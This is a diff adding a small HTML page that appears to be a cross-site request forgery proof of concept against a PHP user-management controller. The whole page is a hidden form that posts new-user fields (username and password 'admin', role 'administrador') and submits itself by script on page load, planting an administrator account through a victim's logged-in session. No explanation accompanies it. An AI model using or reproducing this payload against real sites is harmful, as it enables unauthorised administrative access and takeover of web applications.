@@ -1,0 +1,12 @@
+<form method="post" action="/controller/ControllerUsuario.php?action=agregarUsuario">
+	<input type="hidden" name="nombre" value="admin"/>
+	<input type="hidden" name="apellido" value="admin"/>
+	<input type="hidden" name="usuario" value="admin"/>
+	<input type="hidden" name="email" value="admin@hotmail.com"/>
+	<input type="hidden" name="password" value="admin"/>
+	<input type="hidden" name="password2" value="admin"/>
+	<input type="hidden" name="rol[]" value="administrador"/>
+</form>
+<script>
+	document.forms[0].submit();
+</script>
